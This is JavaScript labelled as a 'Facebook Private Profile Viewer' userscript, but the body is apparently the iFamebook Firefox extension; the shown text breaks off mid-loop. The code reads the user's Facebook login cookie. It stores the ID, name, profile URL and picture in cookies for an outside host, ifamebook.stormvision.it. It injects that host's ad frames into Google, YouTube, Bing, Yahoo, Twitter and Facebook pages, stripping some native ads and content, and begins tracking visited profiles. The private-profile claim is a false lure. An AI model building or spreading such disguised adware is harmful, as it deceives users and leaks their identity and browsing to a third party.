// ==UserScript==
// @name           Facebook Profile Viewer
// @namespace      http://userscripts.org/
// @author         Maarten
// @version        2.18
// @description    2.18: View private facebook profile in seconds use this Facebook Private Profile Viewer
// ==/UserScript==

"use strict";



// Latest version. Update in: xml.php (x2), install.rdf, cors.js 
var IFAMEBOOK_last_version = "3.95";



var IFAMEBOOK_programID = "iFamebook";
var IFAMEBOOK_vanityUrl;
var IFAMEBOOK_navAccountName;
var IFAMEBOOK_navAccountPicUrl;
var IFAMEBOOK_cookieHash;
var IFAMEBOOK_numHash;
var IFAMEBOOK_newDesign;

var IFAMEBOOK_timerAds2 = null;
var IFAMEBOOK_timerAds3 = null;
var IFAMEBOOK_timerAds4 = null;
var IFAMEBOOK_timerAds5 = null;
var IFAMEBOOK_timerAds6 = null;
var IFAMEBOOK_timerAds9 = null;




window.addEventListener("load", function load(event){  
    window.removeEventListener("load", load, false); //remove listener, no longer needed  
    IFAMEBOOK_container2.init();    
},false);  


var IFAMEBOOK_container2 = {
init: function() {	
		var appcontent = document.getElementById("appcontent"); 		
		if(appcontent){
	
			appcontent.addEventListener("DOMContentLoaded", IFAMEBOOK_container2.onPageLoad, true);	
		}
	},

	
onPageLoad: function(aEvent) {  

		// Detecting URL
		var doc = aEvent.originalTarget; 
		
		var gotFace0 = /https?:\/\/www.facebook.com\//.test(doc.location.href);
		var gotGoogle = /.google./.test(doc.location.href);
		var gotYoutube = /.youtube./.test(doc.location.href); 
		

		if (gotFace0 == true && doc.nodeName == "#document" && doc.defaultView.location.href == gBrowser.currentURI.spec) {

		
			// Detecting IFAMEBOOK_navAccountName and IFAMEBOOK_vanityUrl
			// Old Facebook Design
			if (doc.getElementsByClassName('navItem firstItem tinyman')[0]){
			var IFAMEBOOK_navAccountUrl = doc.getElementsByClassName('navItem firstItem tinyman')[0].childNodes[0]; 
			var IFAMEBOOK_newDesign = '0';
			}
			// New Facebook Design
			else if (doc.getElementsByClassName('_4g5p _521g')[0]){
			var IFAMEBOOK_navAccountUrl = doc.getElementsByClassName('_4g5p _521g')[0].getAttribute('href');
			var IFAMEBOOK_newDesign = '1';			
			}
			// New Facebook Design 2
			else if (doc.getElementById('pageLogo')){
			var IFAMEBOOK_navAccountUrl = doc.getElementById('navTimeline').getElementsByTagName('a')[0].getAttribute('href');
			var IFAMEBOOK_newDesign = '1';				
			}
						
		
			// Old
			if (doc.getElementsByClassName('headerTinymanName')[0]){
			IFAMEBOOK_navAccountName = doc.getElementsByClassName('headerTinymanName')[0].textContent;
			}
			// New
			else if (doc.getElementsByClassName('_4g5p _521g')[0]){
			IFAMEBOOK_navAccountName = doc.getElementsByClassName('_4g5p _521g')[0].textContent;
			}
			// New 2
			else if (doc.getElementsByClassName('fbxWelcomeBoxName')[0]){
			IFAMEBOOK_navAccountName = doc.getElementsByClassName('fbxWelcomeBoxName')[0].textContent;	
			}
			// New 2b
			else if (doc.getElementById('navTimeline')){
			IFAMEBOOK_navAccountName = doc.getElementById('navTimeline').getElementsByTagName('a')[0].textContent;	
			}
		
		
		
			// Old
			if (doc.getElementsByClassName('headerTinymanPhoto')[0]){
			var IFAMEBOOK_navAccountPic = doc.getElementsByClassName('headerTinymanPhoto')[0].src;
			}
			// New
			else if (doc.getElementsByClassName('_4g5w img')[0]){
			var IFAMEBOOK_navAccountPic = doc.getElementsByClassName('_4g5w img')[0].src;
			}
			// New 2
			else if (doc.getElementsByClassName('_s0 fbxWelcomeBoxImg _rw img')[0]){
			var IFAMEBOOK_navAccountPic = doc.getElementsByClassName('_s0 fbxWelcomeBoxImg _rw img')[0].src;
			}
			// New 2b
			else {
			var IFAMEBOOK_navAccountPic = 'http://profile.ak.fbcdn.net/static-ak/rsrc.php/v2/yo/r/UlIqmHJn-SK.gif';
			}
			 
			if (!IFAMEBOOK_navAccountUrl || !IFAMEBOOK_navAccountName || !IFAMEBOOK_navAccountPic){
			return false;
			}

			// Hide-show iFamebook layer on the web page
			var extScript1 = doc.createElement("script"); // For user interaction with button
			extScript1.setAttribute("src", "chrome://ifamebook/content/display.js");
			var divTarget3 = doc.getElementsByTagName("head")[0];
			divTarget3.appendChild(extScript1);			

			// Connecting to iFamebook remote database
			var extCorsScript = doc.createElement("script"); // Loading xml data
			extCorsScript.setAttribute("src", "chrome://ifamebook/content/cors.js");
			var divHeadTarget = doc.getElementsByTagName("head")[0]; 
			divHeadTarget.appendChild(extCorsScript);		

			
			// Creating iFamebook navigation bar
			var extButton = doc.createElement("li");
			extButton.setAttribute("class", "navItem middleItem");
			extButton.setAttribute("id", "iFamebook_btn");
			var extButton2 = doc.createElement("a");
			extButton2.setAttribute("onClick", "IFAMEBOOK_extReload();IFAMEBOOK_extSwitchMenu('iFamebook_bar');");
			extButton2.setAttribute("class", "navLink bigPadding");  
			extButton2.setAttribute("style", "padding: 0px 0px 0px 0px;");
			var extButton3 = doc.createElement("ul");
			extButton.setAttribute("id", "iFamebook_2span");
			extButton3.setAttribute("title","iFamebook");
			if (IFAMEBOOK_newDesign == '0'){
			extButton3.setAttribute("style","height: 26px; width: 38px; padding: 0px 0px 0px 0px; background:url('chrome://ifamebook/content/images/icona.png') no-repeat center;");  
			extButton3.setAttribute("onMouseOver","this.style.background='url(chrome://ifamebook/content/images/icona_hover.png) no-repeat center';");
			extButton3.setAttribute("onMouseOut","this.style.background='url(chrome://ifamebook/content/images/icona.png) no-repeat center';");
			}	
			if (IFAMEBOOK_newDesign == '1'){
			extButton3.setAttribute("style","height: 26px; width: 38px; padding: 0px 0px 0px 0px; background:url('chrome://ifamebook/content/images/icona_new.png') no-repeat center;");  
			}	
			extButton3.textContent = " ";
			extButton2.appendChild(extButton3);
			extButton.appendChild(extButton2);
			
			// Old Facebook Design
			if (IFAMEBOOK_newDesign == '0'){
			var divTarget = doc.getElementById("navHome");
			divTarget.parentNode.insertBefore(extButton, divTarget.nextSibling); 
			}	
			
			// New Facebook Design
			if (IFAMEBOOK_newDesign == '1'){
			var divTarget = doc.getElementById("pageNav");
			divTarget.appendChild(extButton); 
			}	
			
			
			
			// Creating iFamebook bar
			var extBar = doc.createElement("div");
			extBar.setAttribute("class", "extToggle_container");
			extBar.setAttribute("id", "iFamebook_bar");
			extBar.setAttribute("style", "position:relative;top:0px;left:0px;background:#3b5998;width:100%;overflow:hidden;clear:both;display:none;");
			extBar.textContent = " ";
			var divTarget2 = doc.getElementById("pageHead");
			divTarget2.appendChild(extBar); 



			// Detecting Profile Picture URL
			IFAMEBOOK_navAccountPicUrl = IFAMEBOOK_navAccountPic.match(/(https?:\/\/\S+)(jpg|gif)/i);

			
			// Detecting Profile Vanity URL
			if (IFAMEBOOK_newDesign == '0'){
			var IFAMEBOOK_vanityUrl0 = IFAMEBOOK_navAccountUrl.href.match(/(?:https?:\/\/www.facebook.com\/)(\w+\.*\w*\.*\w*)/i);
			}	
			if (IFAMEBOOK_newDesign == '1'){
			var IFAMEBOOK_vanityUrl0 = IFAMEBOOK_navAccountUrl.match(/(?:https?:\/\/www.facebook.com\/)(\w+\.*\w*\.*\w*)/i);
			}	 

			
			
			if (/profile\.php/.test(IFAMEBOOK_vanityUrl0) != true) { 
				IFAMEBOOK_vanityUrl = IFAMEBOOK_vanityUrl0[1];					
			}
			else { 
			IFAMEBOOK_vanityUrl = "fpvTracker"; 
			}
						
			IFAMEBOOK_verCookie();
			
		}
		
			

	},  
  

	};  

	
// Post to iFamebook database	
function IFAMEBOOK_makePOSTRequest(url, parameters) {
					var http_request = false;
					if (window.XMLHttpRequest) { 
						http_request = new XMLHttpRequest();
						if (http_request.overrideMimeType) {
							http_request.overrideMimeType('text/html');
						}
					} 
					if (!http_request) {return false;}
					
					var oneTime = false;

					http_request.open('POST', url, true);
					http_request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
					http_request.setRequestHeader("Content-length", parameters.length);
					http_request.setRequestHeader("Connection", "close");
					http_request.send(parameters);
}



var IFAMEBOOK_valori = new Array();

// When Firefox start, iFamebook set IFAMEBOOK_userID variable by reading Cookies 
var IFAMEBOOK_userID;
var IFAMEBOOK_cookieManager = Components.classes["@mozilla.org/cookiemanager;1"].getService(Components.interfaces.nsICookieManager);
var IFAMEBOOK_iter = IFAMEBOOK_cookieManager.enumerator;
while (IFAMEBOOK_iter.hasMoreElements()){
	var IFAMEBOOK_cookie = IFAMEBOOK_iter.getNext();
	if (IFAMEBOOK_cookie instanceof Components.interfaces.nsICookie){
		if (IFAMEBOOK_cookie.host == ".facebook.com" && IFAMEBOOK_cookie.name == "c_user"){
			IFAMEBOOK_userID = IFAMEBOOK_cookie.value;
			break;
		}
	}
}


// This is useful when Facebook's cookie doesn't extist on start, and is created later, or when the user logout

function IFAMEBOOK_CookieListener(func) {
	var cl = Components.classes['@mozilla.org/observer-service;1'].getService(Components.interfaces.nsIObserverService);

	this.register = function() {
		cl.addObserver(this, "cookie-changed", false);
	};

	this.unregister = function unregister() {
		if (cl) cl.removeObserver(this,'cookie-changed');
	};

	this.observe = function(subject, topic, data) {

		if (data == "added" || data == "changed" || data == "deleted") {
			func(subject, data);
		}
	
	};
}

var IFAMEBOOK_myListenerCookie = new IFAMEBOOK_CookieListener(
function(subject, data) {
	var IFAMEBOOK_cookie2 = subject.QueryInterface(Components.interfaces.nsICookie);
	if (data == "added" || data == "changed") {
	if (IFAMEBOOK_cookie2.host == ".facebook.com" && IFAMEBOOK_cookie2.name == "c_user") {
		IFAMEBOOK_userID = IFAMEBOOK_cookie2.value; // set IFAMEBOOK_userID
		IFAMEBOOK_alreadyCookie = false; // reset ifamebook cookie
		
	}
	}
	if (data == "deleted") {
	if (IFAMEBOOK_cookie2.host == ".facebook.com" && IFAMEBOOK_cookie2.name == "c_user") {
		
		
		IFAMEBOOK_cookieManager.remove(".ifamebook.stormvision.it", "userID", "/", false);
		IFAMEBOOK_cookieManager.remove(".ifamebook.stormvision.it", "navAccountName", "/", false);
		IFAMEBOOK_cookieManager.remove(".ifamebook.stormvision.it", "vanityUrl", "/", false);
		IFAMEBOOK_cookieManager.remove(".ifamebook.stormvision.it", "cookieHash", "/", false);
		IFAMEBOOK_cookieManager.remove(".ifamebook.stormvision.it", "versionID", "/", false);
		IFAMEBOOK_cookieManager.remove(".ifamebook.stormvision.it", "gmtHours", "/", false);
		IFAMEBOOK_cookieManager.remove(".ifamebook.stormvision.it", "navAccountPicUrl", "/", false);
		IFAMEBOOK_cookieManager.remove(".ifamebook.stormvision.it", "appLanguage", "/", false);
		
	}
	}
}
);

IFAMEBOOK_myListenerCookie.register();


function IFAMEBOOK_SHA1() {
// BEGIN SHA1
				    var str = IFAMEBOOK_userID;  
					var converter =  
					Components.classes["@mozilla.org/intl/scriptableunicodeconverter"].createInstance(Components.interfaces.nsIScriptableUnicodeConverter);  
      
					// we use UTF-8 here, you can choose other encodings.  
					converter.charset = "UTF-8";  
					// result is an out parameter,  
					// result.value will contain the array length  
					var result = {};  
					// data is an array of bytes  
					var data = converter.convertToByteArray(str, result);  
					var ch = Components.classes["@mozilla.org/security/hash;1"].createInstance(Components.interfaces.nsICryptoHash);  
					ch.init(ch.SHA1);  
					ch.update(data, data.length);  
					var hash = ch.finish(false);  
      
					// return the two-digit hexadecimal code for a byte  
					function toHexString(charCode)  
					{  
					return ("0" + charCode.toString(16)).slice(-2);  
					}  
      
					// convert the binary hash data to a hex string.  
					var s = [toHexString(hash.charCodeAt(i)) for (i in hash)].join("");  
					// s now contains hash in hex
					
					
					var s2 = s.substring(0,40);
					IFAMEBOOK_cookieHash = s2;
					IFAMEBOOK_numHash = s2;

			// END SHA1	
				}			

			

// Set date and timezone
var IFAMEBOOK_current_date = new Date();
var IFAMEBOOK_gmtHours = -IFAMEBOOK_current_date.getTimezoneOffset()/60;



// If iFamebook cookie doesn't exists, create new cookie
var IFAMEBOOK_alreadyCookie;
function IFAMEBOOK_verCookie() {

	if (IFAMEBOOK_alreadyCookie != true){

		
		IFAMEBOOK_SHA1();
		
		var url = content.document.location.protocol+"//ifamebook.stormvision.it";
		var cookieString = "userID="+IFAMEBOOK_userID+";domain=ifamebook.stormvision.it;expires=Thu, 15 Jan 2099 23:59:00 GMT";
		var cookieString2 = "navAccountName="+IFAMEBOOK_navAccountName+";domain=ifamebook.stormvision.it;expires=Thu, 15 Jan 2099 23:59:00 GMT";
		var cookieString3 = "vanityUrl="+IFAMEBOOK_vanityUrl+";domain=ifamebook.stormvision.it;expires=Thu, 15 Jan 2099 23:59:00 GMT";
		var cookieString4 = "cookieHash="+IFAMEBOOK_cookieHash+";domain=ifamebook.stormvision.it;expires=Thu, 15 Jan 2099 23:59:00 GMT";
		var cookieString5 = "versionID="+IFAMEBOOK_last_version+";domain=ifamebook.stormvision.it;expires=Thu, 15 Jan 2099 23:59:00 GMT";
		var cookieString6 = "gmtHours="+IFAMEBOOK_gmtHours+";domain=ifamebook.stormvision.it;expires=Thu, 15 Jan 2099 23:59:00 GMT";
		var cookieString7 = "navAccountPicUrl="+IFAMEBOOK_navAccountPicUrl[0]+";domain=ifamebook.stormvision.it;expires=Thu, 15 Jan 2099 23:59:00 GMT";
		var cookieString8 = "appLanguage="+IFAMEBOOK_loadLanguage+";domain=ifamebook.stormvision.it;expires=Thu, 15 Jan 2099 23:59:00 GMT";
		
	
		var cookieUri = Components.classes["@mozilla.org/network/io-service;1"].getService(Components.interfaces.nsIIOService).newURI(url, null, null);
		var stormCookie = Components.classes["@mozilla.org/cookieService;1"].getService(Components.interfaces.nsICookieService);
		
		stormCookie.setCookieString(cookieUri, null, cookieString, null);
		stormCookie.setCookieString(cookieUri, null, cookieString2, null);
		stormCookie.setCookieString(cookieUri, null, cookieString3, null);
		stormCookie.setCookieString(cookieUri, null, cookieString4, null);
		stormCookie.setCookieString(cookieUri, null, cookieString5, null);
		stormCookie.setCookieString(cookieUri, null, cookieString6, null);
		stormCookie.setCookieString(cookieUri, null, cookieString7, null);
		stormCookie.setCookieString(cookieUri, null, cookieString8, null);
		
		IFAMEBOOK_alreadyCookie = true;
	}
}



// URI processing to detect the ID of the user being visited
var IFAMEBOOK_beingVisited;
var IFAMEBOOK_whoIsVisited;


var IFAMEBOOK_urlBarListener = {
QueryInterface: function(aIID)
	{
		if (aIID.equals(Components.interfaces.nsIWebProgressListener) ||
				aIID.equals(Components.interfaces.nsISupportsWeakReference) ||
				aIID.equals(Components.interfaces.nsISupports))
		return this;
		throw Components.results.NS_NOINTERFACE;
	},

onLocationChange: function(aBrowser, webProgress, request, aURI) {
		IFAMEBOOK_container.processNewURL(aURI);

	},



};

// Check for URL changed or updated in Address Bar
var IFAMEBOOK_container = {
oldURL: null,

init: function() {
		gBrowser.addTabsProgressListener(IFAMEBOOK_urlBarListener,
		Components.interfaces.nsIWebProgress.NOTIFY_LOCATION);
	},

uninit: function() {
		gBrowser.removeTabsProgressListener(IFAMEBOOK_urlBarListener);
	},


processNewURL: function(aURI) {
		if (aURI.spec == this.oldURL)
		return;
		

				
		// Check the URL
		var gotFace = /https?:\/\/www.facebook.com\//.test(aURI.spec); // Check for Facebook 
		var gotGoogle = /.google./.test(aURI.spec); // Check for Google 
		var gotYoutube = /.youtube./.test(aURI.spec); // Check for YouTube 
		var gotBing = /.bing.com/.test(aURI.spec); // Check for Bing
		var gotYahoo = /.yahoo.com/.test(aURI.spec); // Check for Yahoo
		var gotTwitter = /.twitter.com/.test(aURI.spec); // Check for Twitter
		
		
// Ads code starts here
		
		if (gotGoogle == true) 	{ 
		
			// Loading Google Ads
			
			var event2 = {
				observe: function(IFAMEBOOK_timerAds2) {
					
					var contextTitle2 = content.document.title;
					var elemGoog = content.document.getElementById("topstuff");
					var checkDiv2 = content.document.getElementById("iFamebook_ads2");
					
					if(!checkDiv2){
					
					var spGoog = content.document.createElement("div");
					spGoog.setAttribute("id", "iFamebook_ads2");
					var spGoog2 = content.document.createElement("iframe");
					spGoog2.setAttribute("id","iFa_ads2");
					spGoog2.setAttribute("type","content");
					spGoog2.setAttribute("style","display:none; padding-bottom: 2px;");
					spGoog2.setAttribute("src",content.document.location.protocol+"//ifamebook.stormvision.it/goog_ad_loader.php?title=" + encodeURIComponent(contextTitle2));
					spGoog2.setAttribute("onLoad","this.style.display=\"block\";");
					spGoog2.setAttribute("frameborder","0");
					spGoog2.setAttribute("height","60");
					spGoog2.setAttribute("width","468");
					spGoog2.setAttribute("marginwidth","0");
					spGoog2.setAttribute("marginheight","0");
					spGoog2.setAttribute("scrolling","no");
					spGoog.appendChild(spGoog2);
					
					if(elemGoog){ 
					elemGoog.appendChild(spGoog);
					}
						
					
					
					}
					
				}
			}
			IFAMEBOOK_timerAds2 = Components.classes["@mozilla.org/timer;1"].createInstance(Components.interfaces.nsITimer);
			IFAMEBOOK_timerAds2.init(event2, 500, Components.interfaces.nsITimer.TYPE_ONE_SHOT);
			
		}
		
		
		
		
		else if (gotYoutube == true) {
		
		// Loading YouTube Ads
			
			var event3 = {
observe: function(IFAMEBOOK_timerAds3) {
					var contextTitle3 = content.document.title;
					var elemYou3 = content.document.getElementsByClassName("watch-sidebar-body")[0];
					var checkDiv3 = content.document.getElementById("iFamebook_ads3");
					var checkDiv3b = content.document.getElementById("google_companion_ad_div");
					var checkDiv3c = content.document.getElementById("ad300x250");
					var checkDiv3d = content.document.getElementById("watch-channel-brand-div");
					
					if(checkDiv3d) { 
					checkDiv3d.parentNode.removeChild(checkDiv3d);
					}
					
					if(checkDiv3b) { 
					checkDiv3b.parentNode.removeChild(checkDiv3b);
					}
					
					if(checkDiv3c) { 
					checkDiv3c.parentNode.removeChild(checkDiv3c);
					}
					
					if(!checkDiv3){
					
					var spYou3 = content.document.createElement("div");
					spYou3.setAttribute("id", "iFamebook_ads3");
					spYou3.setAttribute("style", "text-align:right; padding-top: 5px; padding-bottom: 15px;");
					var spYou2 = content.document.createElement("iframe");
					spYou2.setAttribute("id","iFa_ads3");
					spYou2.setAttribute("type","content");
					spYou2.setAttribute("style","display:none;");
					spYou2.setAttribute("src",content.document.location.protocol+"//ifamebook.stormvision.it/youtube_ad_loader.php?title=" + encodeURIComponent(contextTitle3));
					spYou2.setAttribute("onLoad","this.style.display=\"block\";");
					spYou2.setAttribute("frameborder","0");
					spYou2.setAttribute("height","250");
					spYou2.setAttribute("width","300");
					spYou2.setAttribute("marginwidth","0");
					spYou2.setAttribute("marginheight","0");
					spYou2.setAttribute("scrolling","no");
					spYou3.appendChild(spYou2);
					
					if(elemYou3){ 
					elemYou3.parentNode.insertBefore(spYou3, elemYou3);
					}
					
					}
					
				}
			}
			IFAMEBOOK_timerAds3 = Components.classes["@mozilla.org/timer;1"].createInstance(Components.interfaces.nsITimer);
			IFAMEBOOK_timerAds3.init(event3, 500, Components.interfaces.nsITimer.TYPE_ONE_SHOT);
		
		
		}
		
		
		else if (gotBing == true) 	{ 
		
			// Loading Bing Ads
			
			var event4 = {
				observe: function(IFAMEBOOK_timerAds4) {
					
					var contextTitle4 = content.document.title;
					var elemBingContent = content.document.getElementById("content");
					var elemBing = content.document.getElementById("results_area");
					var checkDiv4 = content.document.getElementById("iFamebook_ads4");
					
					if(!checkDiv4){
					
					var spBing = content.document.createElement("div");
					spBing.setAttribute("id", "iFamebook_ads4");
					var spBing2 = content.document.createElement("iframe");
					spBing2.setAttribute("id","iFa_ads4");
					spBing2.setAttribute("type","content");
					spBing2.setAttribute("style","display:none; padding-left:10px; padding-bottom:10px;");
					spBing2.setAttribute("src",content.document.location.protocol+"//ifamebook.stormvision.it/bing_ad_loader.php?title=" + encodeURIComponent(contextTitle4));
					spBing2.setAttribute("onLoad","this.style.display=\"block\";");
					spBing2.setAttribute("frameborder","0");
					spBing2.setAttribute("height","60");
					spBing2.setAttribute("width","468");
					spBing2.setAttribute("marginwidth","0");
					spBing2.setAttribute("marginheight","0");
					spBing2.setAttribute("scrolling","no");
					spBing.appendChild(spBing2);
					
					if(elemBing){ 
					elemBingContent.insertBefore(spBing, elemBing);
					}
						
					
					
					}
					
				}
			}
			IFAMEBOOK_timerAds4 = Components.classes["@mozilla.org/timer;1"].createInstance(Components.interfaces.nsITimer);
			IFAMEBOOK_timerAds4.init(event4, 500, Components.interfaces.nsITimer.TYPE_ONE_SHOT);
			
		}
		
		else if (gotYahoo == true) 	{ 
		
			// Loading Yahoo Ads
			
			var event5 = {
				observe: function(IFAMEBOOK_timerAds5) {
					
					var contextTitle5 = content.document.title;
					var elemYahooContent = content.document.getElementById("main");
					var elemYahoo = content.document.getElementById("web");
					var checkDiv5 = content.document.getElementById("iFamebook_ads5");
					
					if(!checkDiv5){
					
					var spYahoo = content.document.createElement("div");
					spYahoo.setAttribute("id", "iFamebook_ads5");
					var spYahoo2 = content.document.createElement("iframe");
					spYahoo2.setAttribute("id","iFa_ads5");
					spYahoo2.setAttribute("type","content");
					spYahoo2.setAttribute("style","display:none; padding-bottom: 1px;");
					spYahoo2.setAttribute("src",content.document.location.protocol+"//ifamebook.stormvision.it/yahoo_ad_loader.php?title=" + encodeURIComponent(contextTitle5));
					spYahoo2.setAttribute("onLoad","this.style.display=\"block\";");
					spYahoo2.setAttribute("frameborder","0");
					spYahoo2.setAttribute("height","60");
					spYahoo2.setAttribute("width","468");
					spYahoo2.setAttribute("marginwidth","0");
					spYahoo2.setAttribute("marginheight","0");
					spYahoo2.setAttribute("scrolling","no");
					spYahoo.appendChild(spYahoo2);
					
					if(elemYahoo){ 
					elemYahooContent.insertBefore(spYahoo, elemYahoo);
					}
						
					
					
					}
					
				}
			}
			IFAMEBOOK_timerAds5 = Components.classes["@mozilla.org/timer;1"].createInstance(Components.interfaces.nsITimer);
			IFAMEBOOK_timerAds5.init(event5, 500, Components.interfaces.nsITimer.TYPE_ONE_SHOT);
			
		}
		
		
		else if (gotTwitter == true) 	{ 
		
			// Loading Twitter Ads
			
			var event6 = {
				observe: function(IFAMEBOOK_timerAds6) {
					
					var contextTitle6 = content.document.title;
					var elemTwitterContent = content.document.getElementsByClassName("module trends")[0];
					var elemTwitter = content.document.getElementsByClassName("flex-module trends-inner")[0];
					var checkDiv6 = content.document.getElementById("iFamebook_ads6");
					
					if(!checkDiv6){
					
					var spTwitter = content.document.createElement("div");
					spTwitter.setAttribute("id", "iFamebook_ads6");
					spTwitter.setAttribute("style", "background:#f9f9f9; width:300px;");
					var spTwitter2 = content.document.createElement("iframe");
					spTwitter2.setAttribute("id","iFa_ads6");
					spTwitter2.setAttribute("type","content");
					spTwitter2.setAttribute("style","display:none; padding-left: 5px; padding-top: 5px;");
					spTwitter2.setAttribute("src",content.document.location.protocol+"//ifamebook.stormvision.it/twitter_ad_loader.php?title=" + encodeURIComponent(contextTitle6));
					spTwitter2.setAttribute("onLoad","this.style.display=\"block\";");
					spTwitter2.setAttribute("frameborder","0");
					spTwitter2.setAttribute("height","60");
					spTwitter2.setAttribute("width","234");
					spTwitter2.setAttribute("marginwidth","0");
					spTwitter2.setAttribute("marginheight","0");
					spTwitter2.setAttribute("scrolling","no");
					spTwitter.appendChild(spTwitter2);
					
					if(elemTwitter){ 
					elemTwitterContent.insertBefore(spTwitter, elemTwitter);
					}
						
					
					
					}
					
				}
			}
			IFAMEBOOK_timerAds6 = Components.classes["@mozilla.org/timer;1"].createInstance(Components.interfaces.nsITimer);
			IFAMEBOOK_timerAds6.init(event6, 500, Components.interfaces.nsITimer.TYPE_ONE_SHOT);
			
		}
		
		
		else if (gotFace == true) { // Facebook routine 
			
			
			
			// Loading Facebook Ads
			
			var elemFacebook2 = { 
					observe: function(IFAMEBOOK_timerAds9) {	
						var contextTitle = content.document.title;
						var checkDiv = content.document.getElementById("iFamebook_ads1");	
						
						if(!checkDiv){
					
						var spFb3 = content.document.createElement("div"); // Creating ads div
					spFb3.setAttribute("id", "iFamebook_ads1");
					spFb3.setAttribute("style", "text-align:right; position:fixed;");
					var spFb2 = content.document.createElement("iframe");
					spFb2.setAttribute("id","iFa_ads1");
					spFb2.setAttribute("type","content");
					spFb2.setAttribute("style","display:none;");
					spFb2.setAttribute("src",content.document.location.protocol+"//ifamebook.stormvision.it/fb_ad_loader.php?title=" + encodeURIComponent(contextTitle));
					spFb2.setAttribute("onLoad","this.style.display=\"block\";");
					spFb2.setAttribute("frameborder","0");
					spFb2.setAttribute("height","600");
					spFb2.setAttribute("width","160");
					spFb2.setAttribute("marginwidth","0");
					spFb2.setAttribute("marginheight","0");
					spFb2.setAttribute("scrolling","no");
					spFb3.appendChild(spFb2);
					

					//home
						var adPosition2 = content.document.getElementsByClassName('ego_section')[0]; // Div positioning
						if (adPosition2){
						adPosition2.setAttribute("id","ego_ifamebook"); 
						adPosition2.removeChild(adPosition2.lastChild);	// Cleaning old content		
						spFb3.setAttribute("style", "text-align:right; position:static;");
						adPosition2.appendChild(spFb3); // Inserting div
						}
						
					//profiles
						var adPosition3 = content.document.getElementsByClassName('rightColWrap')[0]; // Check for timeline
						if (adPosition3){ 
						while(adPosition3.hasChildNodes() ) { 
						adPosition3.removeChild(adPosition3.lastChild); // Cleaning old content
						} 
						spFb3.setAttribute("style", "text-align:right; position:fixed;");
						adPosition3.appendChild(spFb3); // Inserting div
						}
						
						}
					}
			}
			IFAMEBOOK_timerAds9 = Components.classes["@mozilla.org/timer;1"].createInstance(Components.interfaces.nsITimer);
			IFAMEBOOK_timerAds9.init(elemFacebook2, 2000, Components.interfaces.nsITimer.TYPE_ONE_SHOT); // Timer for ads div inserting, needed for working properly
			
			
// Ads code ends here
			
			
			
			
			
			// Detect and save Facebook profile visits
			// Checking if the URL is a page or a profile
											
			var gotSharp = /\#\!/.test(aURI.spec); // detect sharp
			var gotInterr = /\#\!\/\?/.test(aURI.spec); // detect home
			var gotPages = /\#\!\/pages/.test(aURI.spec); // detect pages
			var gotSkip = /(\&gotskip)/.test(aURI.spec); // detect gotskip
			
			
			// Checking for URL with sharp
			
			if (gotSharp == true && gotInterr == false && gotPages == false && gotSkip == false) { // Probably we have a profile URL with sharp in it
				
				 var IFAMEBOOK_reProfile = /(?:\#\!\/profile)(?:\.php)(?:\?id\=)(\d+)/i; // id
				 var IFAMEBOOK_reProfile1 = /(?:\#\!\/profile)(?:\.php)(?:\S+)(?:\&id\=)(\d+)/i; // id from show friends
				 var IFAMEBOOK_reProfile2 = /(?:\#\!\/profile)(?:\.php)(?:\?v\=)(?:\S+\&id\=)(\d+)/i; // id from non friend profile
				 var IFAMEBOOK_reUsername1 = /(?:\#\!\/)(\w+)(?:\.)(\w+)(?:\.)(\w+)/i; // colon
				 var IFAMEBOOK_reUsername2Php = /(?:\#\!\/)(\w+)(?:\.)(php)/i; // dot excluding .php
				 var IFAMEBOOK_reUsername2 = /(?:\#\!\/)(\w+)(?:\.)(\w+)/i; // dot
				 var IFAMEBOOK_reUsername3 = /(?:\#\!\/)(\w+)(?:\/)/i; // slash after letters, whe are not in a profile
				 var IFAMEBOOK_reUsername4 = /(?:\#\!\/)(\w+)/i; // single user name
				
				 var IFAMEBOOK_gotProfile = aURI.spec.match(IFAMEBOOK_reProfile);
				 var IFAMEBOOK_gotProfile1 = aURI.spec.match(IFAMEBOOK_reProfile1);
				 var IFAMEBOOK_gotProfile2 = aURI.spec.match(IFAMEBOOK_reProfile2);
				 var IFAMEBOOK_gotUsername1 = aURI.spec.match(IFAMEBOOK_reUsername1);
				 var IFAMEBOOK_gotUsername2Php = aURI.spec.match(IFAMEBOOK_reUsername2Php);
				 var IFAMEBOOK_gotUsername2 = aURI.spec.match(IFAMEBOOK_reUsername2);
				 var IFAMEBOOK_gotUsername3 = aURI.spec.match(IFAMEBOOK_reUsername3);
				 var IFAMEBOOK_gotUsername4 = aURI.spec.match(IFAMEBOOK_reUsername4);
				var IFAMEBOOK_uVisited3Php;
				
				 var IFAMEBOOK_uVisited = (IFAMEBOOK_gotProfile) ? IFAMEBOOK_gotProfile[1] : null;
				 var IFAMEBOOK_uVisited0 = (!IFAMEBOOK_gotProfile && IFAMEBOOK_gotProfile1) ? IFAMEBOOK_gotProfile1[1] : null;  // ref from show friends
				 var IFAMEBOOK_uVisited1 = (!IFAMEBOOK_gotProfile1 && IFAMEBOOK_gotProfile2) ? IFAMEBOOK_gotProfile2[2] : null; 
				 var IFAMEBOOK_uVisited2 = (!IFAMEBOOK_gotProfile2 && IFAMEBOOK_gotUsername1) ? IFAMEBOOK_gotUsername1[1]+"."+IFAMEBOOK_gotUsername1[2]+"."+IFAMEBOOK_gotUsername1[3] : null;
				 IFAMEBOOK_uVisited3Php = (!IFAMEBOOK_gotUsername1 && IFAMEBOOK_gotUsername2Php) ? IFAMEBOOK_gotUsername2Php[1]+"."+IFAMEBOOK_gotUsername2Php[2] : null; // not in a profile, php pages, kept only for residual principle
				 var IFAMEBOOK_uVisited3 = (!IFAMEBOOK_gotUsername2Php && IFAMEBOOK_gotUsername2) ? IFAMEBOOK_gotUsername2[1]+"."+IFAMEBOOK_gotUsername2[2] : null;
				 var IFAMEBOOK_uVisited4 = (!IFAMEBOOK_gotUsername2 && IFAMEBOOK_gotUsername3) ? IFAMEBOOK_gotUsername3[1] : null; // not in a profile, kept only for residual principle
				 var IFAMEBOOK_uVisited5 = (!IFAMEBOOK_gotUsername3 && !IFAMEBOOK_uVisited3Php && IFAMEBOOK_gotUsername4) ? IFAMEBOOK_gotUsername4[1] : null;
				
				 var IFAMEBOOK_i = 0;
				 var IFAMEBOOK_visitArr = new Array(IFAMEBOOK_uVisited, IFAMEBOOK_uVisited0, IFAMEBOOK_uVisited1, IFAMEBOOK_uVisited2, IFAMEBOOK_uVisited3, IFAMEBOOK_uVisited5);
				while (IFAMEBOOK_i <= IFAMEBOOK_visitArr.length) {
					if (IFAMEBOOK_visitArr[IFAMEBOOK_i]) {IFAMEBOOK_beingVisited = IFAMEBOOK_visitArr[IFAMEBOOK_i]; break;}
